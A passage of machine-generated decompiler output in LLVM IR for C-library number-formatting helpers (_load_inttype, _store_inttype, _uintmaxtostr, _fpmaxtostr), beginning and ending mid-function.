  %v0_8052405 = load i32, i32* @ebx, align 4
  %v1_8052405 = add i32 %v0_8052405, 8
  %v2_8052405 = inttoptr i32 %v1_8052405 to i32*
  %v3_8052405 = load i32, i32* %v2_8052405, align 4
  store i32 %v3_8052405, i32* %eax.global-to-local, align 4
  %v2_8052408 = add i32 %v0_8052405, 24
  %v3_8052408 = inttoptr i32 %v2_8052408 to i32*
  store i32 %v3_8052405, i32* %v3_8052408, align 4
  %v0_805240b = load i32, i32* %eax.global-to-local, align 4
  %v1_805240b = load i32, i32* @ebx, align 4
  %v2_805240b = add i32 %v1_805240b, 16
  %v3_805240b = inttoptr i32 %v2_805240b to i32*
  store i32 %v0_805240b, i32* %v3_805240b, align 4
  %v0_805240e = load i32, i32* %eax.global-to-local, align 4
  %v1_805240e = load i32, i32* @ebx, align 4
  %v2_805240e = add i32 %v1_805240e, 20
  %v3_805240e = inttoptr i32 %v2_805240e to i32*
  store i32 %v0_805240e, i32* %v3_805240e, align 4
  %v0_8052411.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052411

dec_label_pc_8052411:                             ; preds = %dec_label_pc_80523c7, %dec_label_pc_80523fd
  %v2_8052418 = phi i32 [ %v0_80523f0, %dec_label_pc_80523c7 ], [ %v0_8052411.pre, %dec_label_pc_80523fd ]
  %v1_8052411 = inttoptr i32 %v2_8052418 to i32*
  %v2_8052411 = load i32, i32* %v1_8052411, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8052415 = or i32 %v2_8052411, 64
  store i32 %v1_8052415, i32* %eax.global-to-local, align 4
  %v1_8052418 = trunc i32 %v1_8052415 to i16
  %v3_8052418 = inttoptr i32 %v2_8052418 to i16*
  store i16 %v1_8052418, i16* %v3_8052418, align 2
  %v0_805241b = load i32, i32* %eax.global-to-local, align 4
  %v1_805241b = urem i32 %v0_805241b, 65536
  store i32 %v1_805241b, i32* %eax.global-to-local, align 4
  %v3_805241e = and i32 %v0_805241b, 2816
  %v4_805241e = icmp eq i32 %v3_805241e, 0
  %v1_8052421 = icmp eq i1 %v4_805241e, false
  br i1 %v1_8052421, label %dec_label_pc_8052429, label %dec_label_pc_8052423

dec_label_pc_8052423:                             ; preds = %dec_label_pc_8052411
  %v0_8052423 = load i32, i32* @ebx, align 4
  %v1_8052423 = add i32 %v0_8052423, 12
  %v2_8052423 = inttoptr i32 %v1_8052423 to i32*
  %v3_8052423 = load i32, i32* %v2_8052423, align 4
  store i32 %v3_8052423, i32* %eax.global-to-local, align 4
  %v2_8052426 = add i32 %v0_8052423, 28
  %v3_8052426 = inttoptr i32 %v2_8052426 to i32*
  store i32 %v3_8052423, i32* %v3_8052426, align 4
  br label %dec_label_pc_8052429

dec_label_pc_8052429:                             ; preds = %dec_label_pc_8052411, %dec_label_pc_80523ba, %dec_label_pc_8052423
  %v0_8052429 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8052429, i32* %eax.global-to-local, align 4
  %v2_805242b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805242b, i32* %edx.global-to-local, align 4
  store i32 %v0_8052388, i32* @ebx, align 4
  ret i32 %v0_8052429

; uselistorder directives
  uselistorder i32 %v0_805241b, { 1, 0 }
  uselistorder i32 %v1_80523de, { 1, 0, 2 }
  uselistorder i32 %v0_80523f0, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8052394, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052388, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 16, 4, 7, 6, 17, 5, 2, 3, 10, 9, 1, 11, 8, 13, 14, 15, 12 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052429, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052411, { 1, 0 }
  uselistorder label %dec_label_pc_80523a7, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8052430 = icmp slt i32 %tmp5, 0
  %v3_8052461 = and i32 %tmp4, 2048
  %v4_8052461 = icmp eq i32 %v3_8052461, 0
  br i1 %v5_8052430, label %dec_label_pc_8052461, label %dec_label_pc_805243f

dec_label_pc_805243f:                             ; preds = %entry
  %v1_8052442 = icmp eq i1 %v4_8052461, false
  br i1 %v1_8052442, label %dec_label_pc_8052466, label %dec_label_pc_8052444

dec_label_pc_8052444:                             ; preds = %dec_label_pc_805243f
  %v6_8052444 = icmp eq i32 %tmp4, 256
  %v1_805244a = inttoptr i32 %tmp to i32*
  %v2_805244a = load i32, i32* %v1_805244a, align 4
  %v1_805244c = icmp eq i1 %v6_8052444, false
  br i1 %v1_805244c, label %dec_label_pc_8052453, label %dec_label_pc_805244e

dec_label_pc_805244e:                             ; preds = %dec_label_pc_8052444
  %v1_805244e = urem i32 %v2_805244a, 256
  br label %dec_label_pc_805245e

dec_label_pc_8052453:                             ; preds = %dec_label_pc_8052444
  %v6_8052453 = icmp eq i32 %tmp4, 512
  %v1_8052459 = icmp eq i1 %v6_8052453, false
  br i1 %v1_8052459, label %dec_label_pc_805245e, label %dec_label_pc_805245b

dec_label_pc_805245b:                             ; preds = %dec_label_pc_8052453
  %v1_805245b = urem i32 %v2_805244a, 65536
  br label %dec_label_pc_805245e

dec_label_pc_805245e:                             ; preds = %dec_label_pc_8052453, %dec_label_pc_805244e, %dec_label_pc_805245b
  %v0_8052460 = phi i32 [ %v2_805244a, %dec_label_pc_8052453 ], [ %v1_805244e, %dec_label_pc_805244e ], [ %v1_805245b, %dec_label_pc_805245b ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8052460

dec_label_pc_8052461:                             ; preds = %entry
  br i1 %v4_8052461, label %dec_label_pc_805246c, label %dec_label_pc_8052466

dec_label_pc_8052466:                             ; preds = %dec_label_pc_8052461, %dec_label_pc_805243f
  %v1_8052466 = add i32 %tmp, 4
  %v2_8052466 = inttoptr i32 %v1_8052466 to i32*
  %v3_8052466 = load i32, i32* %v2_8052466, align 4
  store i32 %v3_8052466, i32* @edx, align 4
  %v1_8052469 = inttoptr i32 %tmp to i32*
  %v2_8052469 = load i32, i32* %v1_8052469, align 4
  ret i32 %v2_8052469

dec_label_pc_805246c:                             ; preds = %dec_label_pc_8052461
  %v6_805246c = icmp eq i32 %tmp4, 256
  %v1_8052472 = inttoptr i32 %tmp to i32*
  %v2_8052472 = load i32, i32* %v1_8052472, align 4
  %v1_8052474 = icmp eq i1 %v6_805246c, false
  br i1 %v1_8052474, label %dec_label_pc_805247b, label %dec_label_pc_8052476

dec_label_pc_8052476:                             ; preds = %dec_label_pc_805246c
  %v1_8052476 = mul i32 %v2_8052472, 16777216
  %v2_8052476 = sdiv i32 %v1_8052476, 16777216
  br label %dec_label_pc_8052484

dec_label_pc_805247b:                             ; preds = %dec_label_pc_805246c
  %v6_805247b = icmp eq i32 %tmp4, 512
  %v1_8052481 = icmp eq i1 %v6_805247b, false
  br i1 %v1_8052481, label %dec_label_pc_8052484, label %dec_label_pc_8052483

dec_label_pc_8052483:                             ; preds = %dec_label_pc_805247b
  %v1_8052483 = mul i32 %v2_8052472, 65536
  %v2_8052483 = sdiv i32 %v1_8052483, 65536
  br label %dec_label_pc_8052484

dec_label_pc_8052484:                             ; preds = %dec_label_pc_805247b, %dec_label_pc_8052476, %dec_label_pc_8052483
  %v0_8052484 = phi i32 [ %v2_8052472, %dec_label_pc_805247b ], [ %v2_8052476, %dec_label_pc_8052476 ], [ %v2_8052483, %dec_label_pc_8052483 ]
  %v1_8052484 = ashr i32 %v0_8052484, 31
  store i32 %v1_8052484, i32* @edx, align 4
  ret i32 %v0_8052484

; uselistorder directives
  uselistorder i32 %v0_8052484, { 1, 0 }
  uselistorder i32 %v2_8052472, { 2, 0, 1 }
  uselistorder i32 %v2_805244a, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8052484, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805245e, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8052488 = load i32, i32* @ebx, align 4
  store i32 %v0_8052488, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_805248d = ptrtoint i16* %tmp5 to i32
  store i32 %v4_805248d, i32* %ebx.global-to-local, align 4
  %v4_8052491 = trunc i32 %tmp4 to i16
  %v6_8052499 = icmp eq i32 %tmp6, 256
  %v1_805249f = icmp eq i1 %v6_8052499, false
  br i1 %v1_805249f, label %dec_label_pc_80524a5, label %dec_label_pc_80524a1

dec_label_pc_80524a1:                             ; preds = %entry
  %v2_80524a1 = trunc i32 %tmp4 to i8
  %v4_80524a1 = bitcast i16* %tmp5 to i8*
  store i8 %v2_80524a1, i8* %v4_80524a1, align 1
  br label %dec_label_pc_80524c3

dec_label_pc_80524a5:                             ; preds = %entry
  %v6_80524a5 = icmp eq i32 %tmp6, 2048
  %v1_80524ab = icmp eq i1 %v6_80524a5, false
  br i1 %v1_80524ab, label %dec_label_pc_80524b4, label %dec_label_pc_80524ad

dec_label_pc_80524ad:                             ; preds = %dec_label_pc_80524a5
  %sext2 = mul i32 %tmp4, 65536
  %v1_80524ad = sdiv i32 %sext2, 65536
  %v3_80524ad = bitcast i16* %tmp5 to i32*
  store i32 %v1_80524ad, i32* %v3_80524ad, align 4
  %v0_80524af = load i32, i32* %edx.global-to-local, align 4
  %v1_80524af = load i32, i32* %ebx.global-to-local, align 4
  %v2_80524af = add i32 %v1_80524af, 4
  %v3_80524af = inttoptr i32 %v2_80524af to i32*
  store i32 %v0_80524af, i32* %v3_80524af, align 4
  br label %dec_label_pc_80524c3

dec_label_pc_80524b4:                             ; preds = %dec_label_pc_80524a5
  %v6_80524b4 = icmp eq i32 %tmp6, 512
  %v1_80524ba = icmp eq i1 %v6_80524b4, false
  br i1 %v1_80524ba, label %dec_label_pc_80524c1, label %dec_label_pc_80524bc

dec_label_pc_80524bc:                             ; preds = %dec_label_pc_80524b4
  store i16 %v4_8052491, i16* %tmp5, align 2
  br label %dec_label_pc_80524c3

dec_label_pc_80524c1:                             ; preds = %dec_label_pc_80524b4
  %sext3 = mul i32 %tmp4, 65536
  %v1_80524c1 = sdiv i32 %sext3, 65536
  %v3_80524c1 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80524c1, i32* %v3_80524c1, align 4
  br label %dec_label_pc_80524c3

dec_label_pc_80524c3:                             ; preds = %dec_label_pc_80524bc, %dec_label_pc_80524ad, %dec_label_pc_80524a1, %dec_label_pc_80524c1
  %v2_80524c3 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80524c3, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_80524c4 = sdiv i32 %sext, 65536
  ret i32 %v1_80524c4

; uselistorder directives
  uselistorder label %dec_label_pc_80524c3, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_80524d3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80524d3, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_80524df = icmp slt i32 %arg4, 0
  %v1_80524e1 = icmp eq i1 %v2_80524df, false
  br i1 %v1_80524e1, label %dec_label_pc_8052502, label %dec_label_pc_80524e3

dec_label_pc_80524e3:                             ; preds = %entry
  %v1_80524e3 = sub i32 0, %arg4
  store i32 %v1_80524e3, i32* %esi.global-to-local, align 4
  %v2_80524e5 = icmp slt i32 %arg3, 0
  %v1_80524e7 = icmp eq i1 %v2_80524e5, false
  br i1 %v1_80524e7, label %dec_label_pc_8052502, label %dec_label_pc_80524e9

dec_label_pc_80524e9:                             ; preds = %dec_label_pc_80524e3
  %v1_80524e9 = sub i32 0, %arg2
  %v5_80524e9 = icmp ne i32 %arg2, 0
  store i32 %v1_80524e9, i32* %ecx.global-to-local, align 4
  %v2_80524eb = zext i1 %v5_80524e9 to i32
  %v3_80524eb = add i32 %v2_80524eb, %arg3
  %v1_80524ee = sub i32 0, %v3_80524eb
  store i32 %v1_80524ee, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052502

dec_label_pc_8052502:                             ; preds = %entry, %dec_label_pc_80524e3, %dec_label_pc_80524e9
  %v0_8052507 = phi i32 [ %v1_80524e3, %dec_label_pc_80524e9 ], [ %v1_80524e3, %dec_label_pc_80524e3 ], [ %arg4, %entry ]
  %storemerge12 = phi i32 [ 1, %dec_label_pc_80524e9 ], [ 0, %dec_label_pc_80524e3 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8052507
  %tmp31 = urem i32 -1, %v0_8052507
  store i8 0, i8* %arg1, align 1
  %v1_805250c = add i32 %tmp31, 1
  %v1_805250d = load i32, i32* %esi.global-to-local, align 4
  %v12_805250d = icmp eq i32 %v1_805250c, %v1_805250d
  %v1_8052517 = icmp eq i1 %v12_805250d, false
  br i1 %v1_8052517, label %dec_label_pc_8052526, label %dec_label_pc_8052519

dec_label_pc_8052519:                             ; preds = %dec_label_pc_8052502
  %v1_8052519 = add i32 %div, 1
  br label %dec_label_pc_8052526

dec_label_pc_8052526:                             ; preds = %dec_label_pc_8052502, %dec_label_pc_8052519
  %stack_var_-20.0.off0 = phi i32 [ %v1_805250c, %dec_label_pc_8052502 ], [ 0, %dec_label_pc_8052519 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8052502 ], [ %v1_8052519, %dec_label_pc_8052519 ]
  %v0_8052526 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8052526, i32* %ebp.global-to-local, align 4
  %v0_8052528 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052528, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805252c

dec_label_pc_805252c:                             ; preds = %dec_label_pc_805257a, %dec_label_pc_8052526
  %v0_8052563 = phi i32 [ %v0_805257c, %dec_label_pc_805257a ], [ %v0_8052526, %dec_label_pc_8052526 ]
  %v0_8052530 = phi i32 [ %v1_805257e, %dec_label_pc_805257a ], [ %v0_8052528, %dec_label_pc_8052526 ]
  %v1_805252c = icmp eq i32 %v0_8052530, 0
  br i1 %v1_805252c, label %dec_label_pc_8052563, label %dec_label_pc_8052530

dec_label_pc_8052530:                             ; preds = %dec_label_pc_805252c
  %v0_8052534 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8052530, %v0_8052534
  %tmp32 = urem i32 %v0_8052530, %v0_8052534
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_8052563, %v0_8052534
  %tmp33 = urem i32 %v0_8052563, %v0_8052534
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8052547 = mul i32 %tmp32, %stack_var_-20.0.off0
  %v2_805254b = add i32 %tmp33, %v6_8052547
  %v8_8052551 = mul i32 %tmp32, %stack_var_-24.0.in
  %v2_8052556 = add i32 %div8, %v8_8052551
  store i32 %v2_8052556, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_805254b, %v0_8052534
  %tmp34 = urem i32 %v2_805254b, %v0_8052534
  %v2_805255e = add i32 %div9, %v2_8052556
  br label %dec_label_pc_805256b

dec_label_pc_8052563:                             ; preds = %dec_label_pc_805252c
  %v0_8052567 = load i32, i32* %esi.global-to-local, align 4
  %div11 = udiv i32 %v0_8052563, %v0_8052567
  %tmp35 = urem i32 %v0_8052563, %v0_8052567
  br label %dec_label_pc_805256b

dec_label_pc_805256b:                             ; preds = %dec_label_pc_8052530, %dec_label_pc_8052563
  %v13_8052571 = phi i32 [ %tmp34, %dec_label_pc_8052530 ], [ %tmp35, %dec_label_pc_8052563 ]
  %storemerge = phi i32 [ %v2_805255e, %dec_label_pc_8052530 ], [ %div11, %dec_label_pc_8052563 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_805256b = load i32, i32* %edi.global-to-local, align 4
  %v1_805256b = add i32 %v0_805256b, -1
  store i32 %v1_805256b, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8052571, 10
  br i1 %tmp, label %dec_label_pc_8052571, label %dec_label_pc_8052576

dec_label_pc_8052571:                             ; preds = %dec_label_pc_805256b
  %v2_8052571 = add i32 %v13_8052571, 48
  %v12_8052571 = and i32 %v2_8052571, 255
  %v14_8052571 = and i32 %v13_8052571, -256
  %v15_8052571 = or i32 %v12_8052571, %v14_8052571
  br label %dec_label_pc_805257a

dec_label_pc_8052576:                             ; preds = %dec_label_pc_805256b
  %v6_8052576 = add i32 %v13_8052571, %arg5
  %v21_8052576 = and i32 %v6_8052576, 255
  %v23_8052576 = and i32 %v13_8052571, -256
  %v24_8052576 = or i32 %v21_8052576, %v23_8052576
  br label %dec_label_pc_805257a

dec_label_pc_805257a:                             ; preds = %dec_label_pc_8052571, %dec_label_pc_8052576
  %storemerge10 = phi i32 [ %v15_8052571, %dec_label_pc_8052571 ], [ %v24_8052576, %dec_label_pc_8052576 ]
  %v1_805257a = trunc i32 %storemerge10 to i8
  %v3_805257a = inttoptr i32 %v1_805256b to i8*
  store i8 %v1_805257a, i8* %v3_805257a, align 1
  %v0_805257c = load i32, i32* %ebp.global-to-local, align 4
  %v1_805257e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805257e = or i32 %v1_805257e, %v0_805257c
  %v3_805257e = icmp eq i32 %v2_805257e, 0
  %v1_8052580 = icmp eq i1 %v3_805257e, false
  br i1 %v1_8052580, label %dec_label_pc_805252c, label %dec_label_pc_8052582

dec_label_pc_8052582:                             ; preds = %dec_label_pc_805257a
  %v4_8052582 = icmp eq i32 %storemerge12, 0
  br i1 %v4_8052582, label %dec_label_pc_805258d, label %dec_label_pc_8052589

dec_label_pc_8052589:                             ; preds = %dec_label_pc_8052582
  %v0_8052589 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052589 = add i32 %v0_8052589, -1
  store i32 %v1_8052589, i32* %edi.global-to-local, align 4
  %v1_805258a = inttoptr i32 %v1_8052589 to i8*
  store i8 45, i8* %v1_805258a, align 1
  br label %dec_label_pc_805258d

dec_label_pc_805258d:                             ; preds = %dec_label_pc_8052582, %dec_label_pc_8052589
  %v0_8052590 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052590

; uselistorder directives
  uselistorder i32 %v13_8052571, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_805254b, { 1, 0 }
  uselistorder i32 %v0_8052534, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8052530, { 1, 0, 2 }
  uselistorder i32 %v0_8052563, { 1, 0, 3, 2 }
  uselistorder i32 %v1_805250c, { 1, 0 }
  uselistorder i32 %v0_8052507, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805258d, { 1, 0 }
  uselistorder label %dec_label_pc_805257a, { 1, 0 }
  uselistorder label %dec_label_pc_805256b, { 1, 0 }
  uselistorder label %dec_label_pc_8052526, { 1, 0 }
  uselistorder label %dec_label_pc_8052502, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_5()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052599 = load i32, i32* @edi, align 4
  %v0_805259a = load i32, i32* @esi, align 4
  %v0_805259b = load i32, i32* @ebx, align 4
  store i32 %v0_805259b, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_80525b0 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_80525b0 = add i3 %v4_80525b0, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_80525b0, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80525b7 = add i32 %tmp156, 4
  %v2_80525b7 = inttoptr i32 %v1_80525b7 to i32*
  %v3_80525b7 = load i32, i32* %v2_80525b7, align 4
  store i32 %v3_80525b7, i32* %eax.global-to-local, align 4
  %v1_80525be = add i32 %tmp156, 8
  %v2_80525be = inttoptr i32 %v1_80525be to i8*
  %v3_80525be = load i8, i8* %v2_80525be, align 1
  %v4_80525be = zext i8 %v3_80525be to i32
  %v6_80525be = and i32 %v0_805259b, -256
  %v7_80525be = or i32 %v4_80525be, %v6_80525be
  store i32 %v7_80525be, i32* %ebx.global-to-local, align 4
  %v1_80525c1 = inttoptr i32 %tmp156 to i32*
  %v2_80525c1 = load i32, i32* %v1_80525c1, align 4
  store i32 %v2_80525c1, i32* %ebp.global-to-local, align 4
  %v2_80525cd = or i8 %v3_80525be, 32
  %v7_80525cd = zext i8 %v2_80525cd to i32
  %v9_80525cd = and i32 %v3_80525b7, -256
  %v10_80525cd = or i32 %v7_80525cd, %v9_80525cd
  store i32 %v10_80525cd, i32* %eax.global-to-local, align 4
  %v10_80525cf = icmp eq i8 %v2_80525cd, 97
  %v1_80525d5 = icmp eq i1 %v10_80525cf, false
  br i1 %v1_80525d5, label %dec_label_pc_80525de, label %dec_label_pc_80525d7

dec_label_pc_80525d7:                             ; preds = %entry
  %v2_80525d7 = add i8 %v3_80525be, 6
  %v15_80525d7 = zext i8 %v2_80525d7 to i32
  %v18_80525d7 = or i32 %v15_80525d7, %v6_80525be
  store i32 %v18_80525d7, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80525de

dec_label_pc_80525de:                             ; preds = %entry, %dec_label_pc_80525d7
  %stack_var_-207.0 = phi i8 [ %v3_80525be, %entry ], [ %v2_80525d7, %dec_label_pc_80525d7 ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_80525e5 = icmp slt i32 %v2_80525c1, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_80525f4 = select i1 %v2_80525e5, i32 6, i32 %v2_80525c1
  store i32 %v3_80525f4, i32* %ebp.global-to-local, align 4
  %v1_80525f7 = add i32 %tmp156, 12
  %v2_80525f7 = inttoptr i32 %v1_80525f7 to i32*
  %v3_80525f7 = load i32, i32* %v2_80525f7, align 4
  store i32 %v3_80525f7, i32* %eax.global-to-local, align 4
  %v2_80525fa = and i32 %v3_80525f7, 2
  %v3_80525fa = icmp eq i32 %v2_80525fa, 0
  br i1 %v3_80525fa, label %dec_label_pc_8052608, label %dec_label_pc_8052614

dec_label_pc_8052608:                             ; preds = %dec_label_pc_80525de
  %v2_8052608 = urem i32 %v3_80525f7, 2
  %tmp192 = trunc i32 %v2_8052608 to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_8052614

dec_label_pc_8052614:                             ; preds = %dec_label_pc_8052608, %dec_label_pc_80525de
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_80525de ], [ %tmp193, %dec_label_pc_8052608 ]
  %not.v5_8052614 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_8052614, label %dec_label_pc_805268b, label %dec_label_pc_8052636

dec_label_pc_8052636:                             ; preds = %dec_label_pc_8052614
  %v1_8052636 = add i3 %v4_80525b0, -2
  store i3 %v1_8052636, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_805263a = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_805263a, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_8052636
  br label %dec_label_pc_80526c6

bb180:                                            ; preds = %dec_label_pc_8052636
  %v5_805263a = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_805263a, label %bb181, label %dec_label_pc_805263e

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_80526c6

dec_label_pc_805263e:                             ; preds = %bb180
  %not.v4_8052638 = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_8052638, label %dec_label_pc_80526c6, label %dec_label_pc_805275b

dec_label_pc_805268b:                             ; preds = %dec_label_pc_8052614
  store i3 %v4_80525b0, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8052692 = add i32 %tmp156, 16
  %v2_8052692 = inttoptr i32 %v1_8052692 to i32*
  store i32 32, i32* %v2_8052692, align 4
  %v4_8052699 = add i8 %stack_var_-207.0, -96
  %v6_8052699 = sub i8 95, %stack_var_-207.0
  %v7_8052699 = and i8 %v6_8052699, %stack_var_-207.0
  %v8_8052699 = icmp slt i8 %v7_8052699, 0
  %v9_8052699 = icmp eq i8 %v4_8052699, 0
  %v10_8052699 = icmp slt i8 %v4_8052699, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_80526ae = icmp eq i1 %v10_8052699, %v8_8052699
  %v4_80526ae = icmp eq i1 %v9_8052699, false
  %v5_80526ae = and i1 %v4_80526ae, %v3_80526ae
  br i1 %v5_80526ae, label %dec_label_pc_80526b5, label %dec_label_pc_80526b0

dec_label_pc_80526b0:                             ; preds = %dec_label_pc_805268b
  br label %dec_label_pc_80526b5

dec_label_pc_80526b5:                             ; preds = %dec_label_pc_805268b, %dec_label_pc_80526b0
  %v2_80526bd = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80526bd, i32* @ecx, align 4
  br label %dec_label_pc_8052a86

dec_label_pc_80526c6:                             ; preds = %dec_label_pc_805263e, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_80526e0 = xor i3 %v4_80525b0, -4
  store i3 %v3_80526e0, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80526e6

dec_label_pc_80526e6:                             ; preds = %dec_label_pc_8052737, %dec_label_pc_80526c6
  %v0_8052737 = phi i32 [ 4096, %dec_label_pc_80526c6 ], [ %v2_8052737, %dec_label_pc_8052737 ]
  %v2_80526e9 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_80526c6 ], [ %v2_80526e981, %dec_label_pc_8052737 ]
  %v1_8052721 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_80526c6 ], [ %v0_80526e679, %dec_label_pc_8052737 ]
  %v0_805273366 = phi i32 [ 13, %dec_label_pc_80526c6 ], [ %v1_80526e8, %dec_label_pc_8052737 ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_80526c6 ], [ %stack_var_-220.1, %dec_label_pc_8052737 ]
  %v1_80526e8 = add i32 %v0_805273366, -1
  %v4_80526e9 = fcmp ule x86_fp80 %v1_8052721, %v2_80526e9
  br i1 %v4_80526e9, label %dec_label_pc_8052710, label %dec_label_pc_80526ed

dec_label_pc_80526ed:                             ; preds = %dec_label_pc_80526e6
  store x86_fp80 %v1_8052721, x86_fp80* %st0.global-to-local, align 4
  %v3_80526ef = mul i32 %v1_80526e8, 12
  store i32 %v3_80526ef, i32* %eax.global-to-local, align 4
  %v1_80526f2 = add i32 %v3_80526ef, ptrtoint (x86_fp80** @global_var_8058580.237 to i32)
  %v2_80526f2 = inttoptr i32 %v1_80526f2 to x86_fp80*
  %v3_80526f2 = load x86_fp80, x86_fp80* %v2_80526f2, align 4
